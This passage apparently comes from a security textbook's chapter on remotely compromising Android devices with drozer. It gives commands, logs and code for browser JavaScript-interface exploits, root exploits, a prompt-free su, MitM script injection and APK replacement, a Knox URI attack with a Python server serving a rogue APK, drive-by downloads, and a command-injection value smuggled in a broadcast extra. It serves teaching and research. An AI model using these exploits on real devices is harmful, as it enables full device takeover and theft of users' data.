explored\nlater in this chapter in the section, “Infiltrating User Data.” The great thing about being able to install a full\ndrozer package is that you are able to use Context and the payload survives device reboots. This is because the\ndrozer agent catches the BOOT_COMPLETED intent in its manifest, which means that it gets started again when the\ndevice boots up. The other session received by the drozer server is a limited drozer agent as shown previously in\nthe Browser Memory Corruption exploit.\nAndroid Browser JavaScript Interface\nAs explained in the “WebViews” subsection in Chapter 7, all WebViews making use of a JavaScriptInterface\nand targeting an API version before 17 are vulnerable to a remote code execution flaw. This includes all stock\nAndroid web browsers on Android 4.1.1 and older devices. This example looks at abusing this vulnerability using\na drozer exploit at exploit.remote.browser .addjavascriptinterface. The attack begins by running a drozer\nserver on port 80 and then building the exploit:\n$ drozer exploit build exploit.remote.browser.addjavascriptinterface\n--server 192.168.1.112:80 --payload weasel.shell.armeabi --resource /\nUploading weasel to /weasel and W... [ OK ]\nPackaging an Agent... (this may take some time)\nUploading the Agent to /agent.apk and A... [ OK ]\nUploading server.settings... [ OK ]\nUploading libWebViewContext.so... [ OK ]\nUploading blank page to /... [ OK ]\nUploading exploit inclusion page to /... [ OK ]\nUploading exploit to /dz.js... [ OK ]\nDone. The exploit is available on: http://192.168.1.112:80/\nWhen using the MitM helper plug-in for drozer: JS Location =\nhttp://192.168.1.112:80/dz.js\nVisiting the main page from an Android 4.0.4 device yields the following in the drozer server log:\n2014-11-14 10:32:57,713 - drozer.server.protocols.http - INFO - GET /\n2014-11-14 10:32:58,217 - drozer.server.protocols.http - INFO - GET\n/dz.js\n2014-11-14 10:32:59,227 - drozer.server.protocols.http - INFO - GET\n/server.settings\n2014-11-14 10:32:59,314 - drozer.server.protocols.http - INFO - GET\n/libWebViewContext.so\n2014-11-14 10:32:59,330 - drozer.server.protocols.http - INFO - GET\n/agent.jar\n2014-11-14 10:33:00,157 - drozer.server.protocols.http - INFO - GET\n/favicon.ico\n2014-11-14 10:33:00,208 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from 2df0s1l8t5vld\nYou will notice that a unique file is being requested by the exploit named libWebViewContext.so. This is the\ninclusion of the work by David Hartley from MWR InfoSecurity on allowing a drozer agent to obtain the elusive\nContext. This allows the drozer agent to be classloaded and passed Context. This effectively allows the drozer\ncode to be running with exactly the same permissions as the browser and be included as part of the browser's\nrunning code. This is a huge step forward in creating advanced Android exploitation payloads and you can find\nadditional information about it at https://labs.mwrinfosecurity.com/blog/2014/06/12/putting-javascript-\nbridges-into-android-context/. Connecting to this session and typing permissions confirms that you have\nContext and shows the permissions held by the agent, which have been stolen from the browser.\n$ drozer console connect 2df0s1l8t5vld --server 192.168.1.112:80\n.. ..:.\n..o.. .r..\n..a.. . ....... . ..nd\nro..idsnemesisand..pr\n.otectorandroidsneme.\n.,sisandprotectorandroids+.\n..nemesisandprotectorandroidsn:.\n.emesisandprotectorandroidsnemes..\n..isandp,..,rotectorandro,..,idsnem.\n.isisandp..rotectorandroid..snemisis.\n,andprotectorandroidsnemisisandprotec.\n.torandroidsnemesisandprotectorandroid.\n.snemisisandprotectorandroidsnemesisan:\n.dprotectorandroidsnemesisandprotector.\ndrozer Console (v2.3.4)\ndz> permissions\nHas ApplicationContext: YES\nAvailable Permissions:\n- android.permission.ACCESS_ALL_DOWNLOADS\n- android.permission.ACCESS_COARSE_LOCATION\n- android.permission.ACCESS_DOWNLOAD_MANAGER\n- android.permission.ACCESS_FINE_LOCATION\n- android.permission.ACCESS_NETWORK_STATE\n- android.permission.ACCESS_WIFI_STATE\n- android.permission.CHANGE_NETWORK_STATE\n- android.permission.CHANGE_WIFI_STATE\n- android.permission.DEVICE_POWER\n- android.permission.GET_ACCOUNTS\n- android.permission.INTERNET\n- android.permission.MANAGE_ACCOUNTS\n- android.permission.NFC\n- android.permission.READ_CONTACTS\n- android.permission.READ_PHONE_STATE\n- android.permission.READ_SYNC_SETTINGS\n- android.permission.RECEIVE_BOOT_COMPLETED\n- android.permission.SEND_DOWNLOAD_COMPLETED_INTENTS\n- android.permission.SET_WALLPAPER\n- android.permission.STATUS_BAR\n- android.permission.USE_CREDENTIALS\n- android.permission.WAKE_LOCK\n- android.permission.WRITE_EXTERNAL_STORAGE\n- android.permission.WRITE_MEDIA_STORAGE\n- android.permission.WRITE_SECURE_SETTINGS\n- android.permission.WRITE_SETTINGS\n- android.permission.WRITE_SYNC_SETTINGS\n- com.android.browser.permission.READ_HISTORY_BOOKMARKS\n- com.android.browser.permission.WRITE_HISTORY_BOOKMARKS\n- com.android.launcher.permission.INSTALL_SHORTCUT\nLaunching a normal shell from this also confirms that you are running as the browser and using\ncom.android.browser as the base directory to use the drozer agent from:\ndz> shell\napp_81@android:/data/data/com.android.browser $ ls\nagent.dex\nagent.jar\napp_appcache\napp_databases\napp_filesystem\napp_geolocation\napp_icons\napp_webnotification\ncache\ndatabases\nlib\nlibWebViewContext.so\nserver.settings\nshared_prefs\nw\nWhile you have a connected session, explore some post-exploitation techniques on this device that will allow\nyou to obtain root access and install a drozer agent package that persists across reboots. The method used to\ngain the original session will not persist across reboots because it was loaded into memory during the exploit\nand doesn't do anything to ensure that it will be loaded again. In fact, it can't do anything to ensure this with the\nlevel of access it has.\nIn general, if you want to find out what device you are accessing you can observe the output on the drozer\nconsole devices output or perform the following commands:\ndz> shell getprop ro.product.brand\nsamsung\ndz> shell getprop ro.product.model\nGT-I9300\ndz> shell getprop ro.build.version.release\n4.0.4\nA bit of research on the Internet reveals a kernel exploit is available for this device. This particular exploit was\ndiscussed in Chapter 6, “Rooting Explained” under “Exynos Abuse — Exploiting Custom Drivers.” The exploit\nabuses the /dev/exynos-mem device driver for a root shell; drozer has a post-exploitation module available for\nthis. To install all root exploit modules in drozer perform the following:\ndz> module install root.\n...\nProcessing metall0id.root.exynosmem... Done.\n...\nThe output of this module was snipped to show only the relevant root exploit for the device an attacker would\nhave access to. After you install the new root exploit module, it becomes available inside the console:\ndz> ls exynos\nexploit.root.exynosmem Obtain a root shell on Samsung Galaxy S2, S3,\nNote 2 and some other devices.\nRunning this module produces a root shell on the device:\ndz> run exploit.root.exynosmem\n[*] Uploading exynos-abuse\n[*] Upload successful\n[*] chmod 770 /data/data/com.android.browser/exynos-abuse\nsh: No controlling tty (open /dev/tty: No such device or address)\nsh: Can't find tty file descriptor\nsh: warning: won't have full job control\napp_81@android:/data/data/com.android.browser # id\nuid=0(root) gid=10081(app_81) groups=1015(sdcard_rw),1023(media_rw),\n3003(inet)\nNOTE\nIf you do not know of any existing root exploits and enjoy playing high-stakes poker then you can use a\nmodule at exploit.root.mmap_abuse to try to automatically get a root shell for you. The module is present\nafter installing all root post-exploitation modules:\ndz> ls root\n...\nexploit.root.mmap_abuse Iterate through all devices and attempt to\nexploit them to gain a root shell by abusing the mmap device\noperation.\n...\nRunning this module on the same device reveals the following:\ndz> run exploit.root.mmap_abuse\n[*] Uploading mmap-abuse\n[*] Upload successful\n[*] chmod 770 mmap-abuse\n[*] Testing /dev/btlock\n[*] Testing /dev/icdr\n[*] Testing /dev/icd\n[*] Testing /dev/fmradio\n...\n[*] Testing /dev/tty0\n[*] Testing /dev/console\n[*] Testing /dev/tty\n[*] Testing /dev/exynos-mem\n[+] /dev/exynos-mem is vulnerable!\n[+] Enjoy your root shell...\nsh: No controlling tty (open /dev/tty: No such device or address)\nsh: Can't find tty file descriptor\nsh: warning: won't have full job control\napp_129@android:/data/data/com.mwr.dz #\nIt basically tries to exploit all block devices present on the device in exactly the same way as the exynos\nabuse exploit. This is a very dangerous thing to do on a device because it could cause a kernel panic that\nreboots the device. At this stage in the exploitation process it would mean that the session is lost.\nHowever, using this as a targeted exploit against a known vulnerable block device is very effective. For\ninstance, in addition to working on a Galaxy S3, this module can be used against a Huawei P2 device with\nsuccess (see https://labs.mwrinfosecurity.com/advisories/2014/11/05/huawei-p2-hx170dec-\nprivilege-escalation-vulnerability/). Using this module with --device /dev/hx170dec gives a root\nshell on a Huawei P2. Likely many more devices are vulnerable to the same issue that this module\nexploits.\nTo keep this root access, you must install a special version of the su binary bundled with drozer named minimal\nsu. This binary was discussed briefly in Chapter 6 under “Rooting Objectives.” When you place this binary on\nthe device and install it correctly, it will give a root shell to any application that asks without prompting the user\nin any way. A helper module to help set it up correctly is available at tool.setup.minimalsu. Running it reveals\nthe following:\ndz> run tools.setup.minimalsu\n[+] Uploaded minimal-su\n[+] Uploaded install-minimal-su.sh\n[+] chmod 770 /data/data/com.android.browser/install-minimal-su.sh\n[+] Ready! Execute /data/data/com.android.browser/install-minimal-su.sh\nfrom root context to install minimal-su\nNow running the generated script from the root shell installs minimal su correctly on the device:\napp_81@android:/data/data/com.android.browser # /data/data/com.android\n.browser/install-minimal-su.sh\nDone. You can now use `su` from a drozer shell.\nYou can now run su from a normal shell and obtain root access on the device at will without reusing an exploit:\ndz> shell\napp_81@android:/data/data/com.android.browser $ su -i\nsh: No controlling tty (open /dev/tty: No such device or address)\nsh: Can't find tty file descriptor\nsh: warning: won't have full job control\napp_81@android:/data/data/com.android.browser #\nAnyone with root access has the privileges to install a new package. This fact allows the attacker to install a full\ndrozer agent package with all available permissions on the device. As mentioned, this agent will also persist\nacross reboots because it catches the BOOT_COMPLETED intent. The weasel payload was used to set up all of the\nexisting attacks thus far and can be used to retrieve a drozer agent from the server and install it as well. Weasel\nis in the private data directory of the exploited application in a file named w. Running weasel as root and\nproviding it with the IP address and port of the server produces the following output:\napp_81@android:/data/data/com.android.browser # ./w 192.168.1.112 80\nSuccess\nBroadcasting: Intent { act=com.mwr.dz.PWN }\nBroadcast completed: result=0\nStarting service: Intent { cmp=com.mwr.dz/.Agent }\npkg: /data/data/com.android.browser/agent.apk\nThis will most certainly break the current shell session and you would need to press Control+C to exit it. This is\nbecause of the app_process replacement technique used by weasel that was discussed earlier. After you issue the\nprevious command, the following is displayed in the drozer server logs:\n2014-11-14 12:05:03,206 - drozer.server.protocols.http - INFO - GET\n/agent.apk\n2014-11-14 12:12:01,257 - drozer.server.protocols.shell - INFO -\naccepted shell from 192.168.1.109:42883\n2014-11-14 12:12:01,268 - drozer.server.protocols.http - INFO - GET\n/agent.apk\n2014-11-14 12:12:01,273 - drozer.server.protocols.http - INFO - GET\n/agent.jar\n2014-11-14 12:12:03,369 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from 5i995jpik7r7h\n2014-11-14 12:12:10,067 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from 1b6b125f54bdda30\nYou receive a reverse shell connection and two more drozer sessions! Querying the server now shows three\nconnected sessions:\n$ drozer console devices --server 127.0.0.1:80\nList of Bound Devices\nDevice ID Manufacturer Model Software\n5i995jpik7r7h samsung GT-I9300 4.0.4\n2df0s1l8t5vld samsung GT-I9300 4.0.4\n1b6b125f54bdda30 samsung GT-I9300 4.0.4\nNotice that one of these sessions has a longer Device ID. This is because drozer assigns shorter Device IDs to\nthe JAR agent loaded through exploitation techniques than installed versions of the agent. Connecting to the\nsession with the longer ID reveals that this is an installed version of drozer:\n$ drozer console connect 1b6b125f54bdda30 --server 192.168.1.112:80\n.. ..:.\n..o.. .r..\n..a.. . ....... . ..nd\nro..idsnemesisand..pr\n.otectorandroidsneme.\n.,sisandprotectorandroids+.\n..nemesisandprotectorandroidsn:.\n.emesisandprotectorandroidsnemes..\n..isandp,..,rotectorandro,..,idsnem.\n.isisandp..rotectorandroid..snemisis.\n,andprotectorandroidsnemisisandprotec.\n.torandroidsnemesisandprotectorandroid.\n.snemisisandprotectorandroidsnemesisan:\n.dprotectorandroidsnemesisandprotector.\ndrozer Console (v2.3.4)\ndz> shell\napp_129@android:/data/data/com.mwr.dz $\nThis session has a huge set of permissions assigned to it and can also make use of the planted su inside a shell\nto obtain root access. It is fair to say that this device has been completely compromised simply by browsing to a\nwebsite! Other web browsers that contain JavaScript interfaces and target API versions of 16 or less will be\nexploitable in exactly the same fashion.\nMan-in-the-Middle Exploits\nYou can intercept connections from users on a huge scale if you are an organization that provides Internet\nservices to the masses. Similarly, breaking SSL is easy if you are a government that has influence on a CA that is\ntrusted by your device. However, we will explore man-in-the-middle (MitM) attacks that do not rely on such\naccess. Two suitable ways to ensure that you are in a position to perform man-in-the-middle attacks are by:\nHosting your wireless network with free Internet access. You can define your own default gateway to the\nInternet or perform a variety of other setups that ensure that you can manipulate traffic.\nConnecting to a wireless network with your computer, which allows you to perform ARP spoofing attacks on\ndevices on the same subnet as your computer.\nGeneral exploitation steps for performing MitM attacks on a connected wireless network are:\nConnect to a wireless network where you know Android devices are also connected.\nARP spoof the entire network so that their traffic comes through your computer.\nRun Burp and start an invisible proxy listener on port 8080.\nUse iptables to redirect traffic from port 80 to your proxy on port 8080.\nInjecting Exploits for JavaScript Interfaces\nDevices that contain applications making use of JavaScript interfaces and loading content over the Internet are\nat risk of being exploited. An attacker who is in the position to inject arbitrary JavaScript into HTTP responses\nthat end up being interpreted by a WebView can exploit devices with a huge success rate. Even the latest devices\nat the time of writing could be remotely exploited if applications on the device are using vulnerable WebView\ncomponents and application configuration.\nWithout further ado, let's exploit a Sony Xperia Z2 running Android 4.4.2 using a MitM attack. The particular\napplication we are going to be exploiting loads advertisements. Advertising companies make use of WebViews\nwith JavaScript interfaces to load these adverts over cleartext. They are some of the worst offenders of this issue\nas per https://www.mwrinfosecurity.com/ articles/ad-network-research/. This means that if the application\nis targeting an SDK version of 16 or lower, you can compromise this application using MitM attacks. For this\nexample, you will be using the same exploit setup in drozer used earlier in the Android Browser JavaScript\ninterface example. Except now instead of being able to visit a web page that loads dz.js, you will be actively\ninjecting it into HTTP responses. Perform your usual MitM setup using Ettercap and Burp and then load the\ndrozer MitM helper extension. Make use of the JavaScript Injection tool to inject links to\nhttp://192.168.1.112/dz.js and then click the button to enable it. Figure 8.6 shows this setup.\nFigure 8.6 Setting up the drozer MitM helper extension for JavaScript injection\nOn the device, the test application that loads an advertisement is opened. This causes a request to be made to\nthe server and the Burp extension injects the following into the reply:\n<script src=\"http://192.168.1.112/dz.js\"></script>\nThis is done using a few techniques that look for good places to reliably inject into the HTML. As soon as the\nrequest is made, it injects the JavaScript into a response, as shown in Figure 8.7.\nFigure 8.7 Burp extension showing that an injection has taken place\nThe application immediately retrieves dz.js from the drozer server and loads it. In the same way as before,\ndz.js uses weasel with the help of libWebViewContext.so to load a drozer agent inside the application and\nconnect it to your server. This is shown in the drozer server log:\n2014-11-14 15:33:58,692 - drozer.server.protocols.http - INFO - GET\n/dz.js\n2014-11-14 15:34:25,103 - drozer.server.protocols.http - INFO - GET\n/server.settings\n2014-11-14 15:34:25,803 - drozer.server.protocols.http - INFO - GET\n/libWebViewContext.so\n2014-11-14 15:34:25,842 - drozer.server.protocols.http - INFO - GET\n/agent.jar\n2014-11-14 15:34:26,669 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from qv72depj41ld\nListing the available connections on the drozer server shows that a Sony D6503 is connected:\n$ drozer console devices --server 127.0.0.1:80\nList of Bound Devices\nDevice ID Manufacturer Model Software\nqv72depj41ld Sony D6503 4.4.2\nConnecting to this and checking what permissions you have obtained reveals the following, which matches that\nof the vulnerable application:\n$ drozer console connect qv72depj41ld --server 192.168.1.112:80\n.. ..:.\n..o.. .r..\n..a.. . ....... . ..nd\nro..idsnemesisand..pr\n.otectorandroidsneme.\n.,sisandprotectorandroids+.\n..nemesisandprotectorandroidsn:.\n.emesisandprotectorandroidsnemes..\n..isandp,..,rotectorandro,..,idsnem.\n.isisandp..rotectorandroid..snemisis.\n,andprotectorandroidsnemisisandprotec.\n.torandroidsnemesisandprotectorandroid.\n.snemisisandprotectorandroidsnemesisan:\n.dprotectorandroidsnemesisandprotector.\ndrozer Console (v2.3.4)\ndz> permissions\nHas ApplicationContext: YES\nAvailable Permissions:\n- android.permission.ACCESS_NETWORK_STATE\n- android.permission.CAMERA\n- android.permission.INTERNET\n- android.permission.READ_EXTERNAL_STORAGE\n- android.permission.WRITE_CALENDAR\n- android.permission.WRITE_CONTACTS\n- android.permission.WRITE_EXTERNAL_STORAGE\nAt the time of writing, this was a fairly up-to-date device. However, it was still vulnerable to the Futex\nvulnerability discussed in Chapter 6 that can be exploited by Towelroot. You can use a post-exploitation module\ninside drozer at exploit.root.towelroot to obtain root on this device. Details on this module are:\ndz> ls towel\nexploit.root.towelroot Obtain a root shell on devices running Android\n4.4 KitKat and/or kernel build date < Jun 3 2014.\nRunning this module from your session confirms that you can indeed obtain root on this device:\ndz> run exploit.root.towelroot\n[*] Uploading towelroot\n[*] Upload successful\n[*] chmod 770 /data/data/com.conversantmedia.sdksample/towelroot\n[*] WARNING: Do not type 'exit' - rather use Control+C otherwise you\nwill reboot the device!\n[*] Executing...hold thumbs...\n/system/bin/sh: can't find tty fd: No such device or address\n/system/bin/sh: warning: won't have full job control\nu0_a246@D6503:/data/data/com.conversantmedia.sdksample # id\nuid=0(root) gid=0(root)\ngroups=1015(sdcard_rw),1028(sdcard_r),2991(removable_rw),3003(inet),\n50246(all_a246) context=u:r:kernel:s0\nTIP\nIf you are running a root exploit and it does not show the shell prompt, simply type sh -i to spawn a new\nshell that displays a prompt. However, be careful of using this on devices with SELinux in enforcing mode\nbecause this may provide you a different SELinux context than the originally spawned shell.\nCustom Application Updates\nSome application developers design pre-installed applications to manage their own application updates through\ntheir own code and not through a management system like an app store. For applications to install their own\nupdates they would need to hold the INSTALL_PACKAGES permission. Typically, these applications check a server\non the Internet for the latest available version of their Android package and then download the APK from the\nserver if a newer version than the one installed is available.\nAn alarming number of device manufacturers do this and even download these new APKs over a cleartext HTTP\nconnection. This gives attackers an opportunity to intercept APKs in transit and replace them with a malicious\npackage, like a rogue drozer agent. To perform this attack on a connected wireless network, do the usual MitM\nsetup with Ettercap and Burp. Then load the drozer MitM helper extension and use the APK Replacement tool.\nIf anyone you are intercepting traffic for downloads an APK over cleartext, it will be replaced with the APK you\nprovided. If you have chosen to use a rogue drozer agent as your payload, then after it has been replaced you will\nneed to invoke it. Again, this is because applications are installed in an inactive state and so it would need to be\nactively invoked. You can do this by using the Invoke drozer using pwn:// tool in the Burp extension. Figure 8.8\nshows a screenshot of this setup.\nFigure 8.8 Setting up the drozer MitM helper extension to replace APKs and then invoke them\nInvoking the drozer agent means injecting code that tries to load a page from a URI starting with pwn:// into the\nHTML of a response. The difference between active invocation and passive invocation is that passive invocation\ninjects an iframe into the HTML that loads from pwn:// whereas active invocation redirects the browser to\npwn://. Active invocation is much more noticeable but is unfortunately the only option on Chromium versions\n25 and later. Invoking the agent on a newer device would require the “active invocation” checkbox to be ticked.\nThis example mimics a scenario where an application downloads an APK in cleartext. To do this you browse to a\nwebsite that hosts an APK and install it.\nThe log in the Burp MitM extension looks like the following:\n2014-11-16 13:17:03 http://37.48.83.23:80/download/TeamViewer.apk Got\nrequest for APK...\n2014-11-16 13:17:06 http://37.48.83.23:80/download/TeamViewer.apk\nReplaced APK!\nYou can now assume that this has been installed on the device. Now attempt to invoke the agent through the\npwn:// handler. Any website that the user visits will have this URI injected into it. After browsing to a website\non the device, you receive the following in the extension's log:\n2014-11-16 13:20:01 http://www.somesite.co.za:80/ Injected drozer\ninvocation with pwn://\nYou also receive your session in the drozer server log:\n2014-11-16 15:20:12,672 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from 7266ee96657c506\nQuerying the drozer server for the connected devices results in the following:\n$ drozer console devices --server 192.168.1.112:80\nList of Bound Devices\nDevice ID Manufacturer Model Software\n7266ee96657c506 asus Nexus 7 5.0\nThis was performed on a Nexus 7 tablet running Android 5.0. Although the scenario was fictitious you can see\nhow it can be blindly applied on a network of unknown devices to install rogue drozer agents on devices.\nAdmittedly, it does require a degree of luck with the timing of update requests from devices, but the reward is a\npersistent Trojan on a remote device with a lot of permissions!\nThis attack could similarly be applied to applications that load code from remote sources. A great example of\nthis is the AppLovin Ad Library that loaded JAR files from remote sources (see\nhttps://labs.mwrinfosecurity.com/blog/2013/11/20/applovin-ad-library-sdk-remote-command-execution-\nvia-update-mechanism/). It retrieved JAR files over a cleartext connection and then blindly loaded them into the\napplication.\nBROWSABLE URI Injection\nApplications that have an intent filter for an activity defined with the BROWSABLE category set have the ability to\nbe invoked from a web browser. Any chain of events that takes place after invocation should be highly\nscrutinized by attackers because it is a lucrative target for exploitation. An excellent example of such an attack is\nthe UniversalMDMClient application, which is part of the Samsung Knox suite of applications present on many\nhigh-end Samsung devices. It has the following intent filter defined on one of its activities:\n<intent-filter>\n<data android:scheme=\"smdm\" />\n<action android:name=\"android.intent.action.VIEW\" />\n<category android:name=\"android.intent.category.DEFAULT\" />\n<category android:name=\"android.intent.category.BROWSABLE\" />\n</intent-filter>\nOn November 16, 2014, André Moulu from Quarkslab found a vulnerability in this application that can be used\nto remotely exploit it. He found a code path that can allow the installation of arbitrary packages that can be\ninvoked by the following URI:\nsmdm://whatever?update_url=http://yourserver/\nWhen this activity is invoked in this manner it contacts the server specified in the update_url parameter with a\npath of //latest. As long as the server responds with the following server headers, the attack goes ahead:\nContent-Length—The size of the APK it is retrieving\nETag—Any unique string such as the MD5 hash of the APK\nx-amz-meta-apk-version—The latest available version of the application\nAfter the application gets the response back from the server, it prompts the user to install the update. You can\nsee an example of this in Figure 8.9.\nFigure 8.9 The prompt shown to the user after a valid response is obtained from the server\nIf the user accepts this prompt, the application is installed from the remote server. The proof of concept\nprovided by André at http://blog.quarkslab .com/abusing-samsung-knox-to-remotely-install-a-malicious-\napplication-story-of-a-half-patched-vulnerability.html can be used to compromise a device using MitM\ntechniques. In this example a rogue drozer agent is provided as the APK to be installed on the device and so the\nproof of concept was slightly tweaked to accommodate this. In addition, the listening port of the server was\nchanged. The resulting code is as follows:\nimport hashlib\nfrom BaseHTTPServer import BaseHTTPRequestHandler\nAPK_FILE = \"agent.apk\"\nAPK_DATA = open(APK_FILE,\"rb\").read()\nAPK_SIZE = str(len(APK_DATA))\nAPK_HASH = hashlib.md5(APK_DATA).hexdigest()\nclass MyHandler(BaseHTTPRequestHandler):\ndef do_GET(self):\nself.send_response(200)\nself.send_header(\"Content-Length\", APK_SIZE)\nself.send_header(\"ETag\", APK_HASH)\nself.send_header(\"x-amz-meta-apk-version\", \"1337\")\nself.end_headers()\nself.wfile.write(APK_DATA)\nreturn\ndef do_HEAD(self):\nself.send_response(200)\nself.send_header(\"Content-Length\", APK_SIZE)\nself.send_header(\"ETag\", APK_HASH)\nself.send_header(\"x-amz-meta-apk-version\", \"1337\")\nself.end_headers()\nreturn\nif __name__ == \"__main__\":\nfrom BaseHTTPServer import HTTPServer\nserver = HTTPServer(('0.0.0.0',4444), MyHandler)\nserver.serve_forever()\nThis code creates an HTTP server listening on port 4444. Now you can set up the Custom URI Handler Injection\ntool in the drozer MitM helper extension in Burp to look like Figure 8.10.\nFigure 8.10 The configuration of the Custom URI Handler Injection section of the drozer Burp plug-in\nProviding agent.apk in the same directory as the server and then performing usual MitM techniques and\nproxying traffic through Burp will allow the compromise of various Samsung devices (with Knox support) on\nthe network. Visiting a cleartext website on a Samsung Galaxy S5 results in the following log entry in the Burp\nplug-in:\n2014-11-16 10:47:42 http://www.somesite.co.za:80/ Injected custom URI\nSimultaneously, the following is printed to screen from André's Python script:\n192.168.1.112 - - [16/Nov/2014 10:47:41] \"HEAD //latest HTTP/1.1\" 200 -\n192.168.1.112 - - [16/Nov/2014 10:47:50] \"GET //latest HTTP/1.1\" 200 -\nThe presence of the HEAD request tells us that the custom URI was successfully injected and the\nUniversalMDMClient activity was opened. The GET request tells us that the user has accepted the prompt and\nchosen to install the application. Note that if the user chooses not to install the application, the Burp extension\nwill simply inject it again into the next HTTP response and prompt the user again. You can keep the URI\ninjection running until the user chooses to accept the prompt and install the application. After you receive the\nGET request, you can assume that the application has been installed. Then you need to invoke the installed\ndrozer package in the same way shown earlier. Note that turning this exploit into a completely remote one\nwithout the need for MitM is also possible. A remote exploit for this can be found in drozer at exploit\n.remote.browser.knoxsmdm.\nOther examples of attacks using BROWSABLE activities exist. Some of them may require additional\ninterception of responses and even DNS spoofing attacks. However, the fact remains that BROWSABLE\nactivities are an excellent entry point into a device and have application for real-world practical attacks.\nMalware\nThe intention of a malware author could vary wildly. Malware can also be distributed in a number of ways. The\nmajority of techniques used by malware authors are not sophisticated. Some of the more sophisticated malware\npreys on people's greediness by offering paid applications that are “cracked” to remove checks for the validity of\nthe purchase. This is a clever way to incorporate malware inside these applications. However, in this section we\nonly explore two scenarios:\nImproving the drive-by download attack with social engineering\nUsing a zero permission application to install additional packages\nDrive-By Downloads\nWebsite owners with questionable morals or who have suffered a compromise may be serving Android\napplications that automatically download when you visit their site. This is known as a drive-by download. In the\ncase of Android, this is a pure social engineering attack against the user. The website may try to trick the user\ninto installing the application by displaying messages about a missing plug-in or a mobile application\nreplacement instead of visiting the website in a browser. However it is worded, the premise of the attack\nremains the same: The user has to install the downloaded APK. Installing an application in this way requires a\nsetting named “Unknown Sources” to be checked in the settings. All this setting does is control whether the user\ncan open an APK in the Package Installer activity or not. Contrary to popular belief, it has no bearing on any\nother techniques used to install additional APKs that are not from the Play Store.\nThis example examines how to perform this attack using the drozer exploit at\nexploit.remote.socialengineering.unknownsources. The pages that serve a rogue drozer agent and the actual\nAPK can be pushed to a drozer server listening on port 80 as follows:\n$ drozer exploit build exploit.remote.socialengineering.unknownsources\n--server 192.168.1.112:80 --resource /\nUploading blank page to /... [ OK ]\nUploading agent to /plug-in.apk... [ OK ]\nUploading web delivery page to /... [ OK ]\nDone. Exploit delivery page is available on: http://192.168.1.112:80/\nThis uploads the page that serves the download from the web root and in this instance can be accessed by\nvisiting http://192.168.1.112 from an Android phone. This example visits this site both from an Android phone\nrunning an older version of the Android browser and a device running KitKat with the most updated Google\nChrome browser. We will note the improvements made to the security model and how they affect this attack.\nMalware authors who relied on drive-by downloads often made use of the RECEIVE_BOOT_COMPLETED permission\nin their application manifest because it was a reliable way to invoke the application after it had been installed.\nApplications that catch the BOOT_COMPLETED intent allow the application to be started when the phone boots up.\nThis ensures that at some stage the malware will be run even if the user does not ever start up the newly\ninstalled application. Visiting the drozer server from an Android 2.3 device, downloading and installing the\npackage, and then rebooting the device results in a session being received when BOOT_COMPLETED is received. Also\nnotice that the download is initiated automatically and never asks whether the user would like to download it.\nUsing the BOOT_COMPLETED invocation method on older versions of Android is reliable but who wants to wait\nuntil the user reboots her device to receive a session? To invoke an application automatically after the APK has\nbeen downloaded, the drozer module loads an iframe with src=\"pwn://lol\" that constantly gets refreshed. This\nmeans that on an Android 2.3 device, installing the APK immediately yields a session on the drozer server:\n2014-11-14 01:19:49,430 - drozer.server.protocols.http - INFO - GET /\n2014-11-14 01:19:49,555 - drozer.server.protocols.http - INFO - GET\n/favicon.ico\n2014-11-14 01:19:51,572 - drozer.server.protocols.http - INFO - GET\n/plug-in.apk\n2014-11-14 01:19:52,320 - drozer.server.protocols.http - INFO - GET\n/plug-in.apk\n2014-11-14 01:21:24,775 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from 4abaa41aed56c78f\nSince Android 3.1, a newly installed application does not receive the BOOT_COMPLETED intent unless some\ncomponent of its code has been invoked by the user because of its “inactive” state. This stumped many malware\nauthors and this technique now seems less prevalent since this addition. However, this attack is still very much\nalive using something like drozer's pwn:// handler. Automatic invocation takes place on all Android devices\nrunning Chromium versions 24 or less.\nThis attack on an Android 4.4 device running the latest version of Google Chrome is somewhat different.\nChrome does not allow the automatic download of the APK. It prompts users whether they would like the APK\nto download and issues a warning that downloading an APK may be dangerous. If a user ignores this and installs\nthe APK, automatically invoking the newly installed application by using an iframe is not possible. A link would\nneed to be provided that the user clicks that loads from a pwn:// address. This is slightly less convenient but still\na completely valid attack vector. Figure 8.11 shows the page on a KitKat device where a user would have to click\nthe “reload” button to invoke the newly installed drozer agent.\nFigure 8.11 The drozer exploit page attempting to perform social engineering to get the user to click the reload\nbutton\nRequesting Zero Permissions\nA clever malware author could create an application that requests no permissions at all and abuses\nvulnerabilities in devices to install additional packages or compromise applications in another way. There is a\nhuge scope for attacking other applications without having any particular permissions, as was explored in\nChapter 7. Assuming that the ultimate goal of an application requesting zero permissions is to install an\nadditional package, this additional package could then request all available permissions and allow the\ninfiltration of user data to a larger degree. Obtaining the ability to install an additional package without\npermissions is considered “breaking out of the sandbox.” As you have seen, sandbox is a loose term.\nNonetheless, the implementation of the Android security model in the device would be broken if you could do\nthis.\nA reliable technique would be to include publicly available kernel exploits inside the application. Targeting these\nexploits correctly according to the device could bring success to the malware author. With root access, installing\nan additional package would certainly be possible. Let us explore an interesting example of a vulnerability in a\npre-installed application on a Samsung Galaxy S3 with the package name com.sec.android.app.servicemodeapp.\nThis application has a sharedUserId set to android.uid.system in its manifest. André Moulu from QuarksLab\ndiscovered that this application had a command injection vulnerability in one of its broadcast receivers that\nallows for execution of arbitrary commands as the system user. A simplified version of the code that performs a\nbasic Runtime.getRuntime().exec() is as follows:\nFTATDumpService.this.DoShellCmd(\"dumpstate > /data/log/\" + str + \".log\")\nWhere str is controlled by an extra as part of the Intent passed from the broadcast receiver with the key\nFILENAME. The proof of concept shown by André simply wrote a file to the SD card:\n$ adb shell am broadcast -a com.android.sec.FTAT_DUMP --es FILENAME\n`../../../../../dev/null;/system/bin/id > /sdcard/shellescape;'\nBroadcasting : Intent { act=com.android.sec.FTAT_DUMP (has extras) }\nBroadcast completed : result=0\nYou can find more information about this vulnerability in his presentation at\nhttp://www.quarkslab.com/dl/Android-OEM-applications-insecurity-and-backdoors-without-\npermission.pdf. This could have been used to devastating ends by a malware author. Now we'll get this\napplication to execute weasel as a proof of concept and show what exploitation of this issue allows. Perform the\nfollowing steps:\n1. Start a drozer server on an Internet-facing machine.\n2. Build a rogue drozer agent and upload it to the server as follows:\n$ drozer agent build --server 192.168.1.112:80 --rogue\nDone: 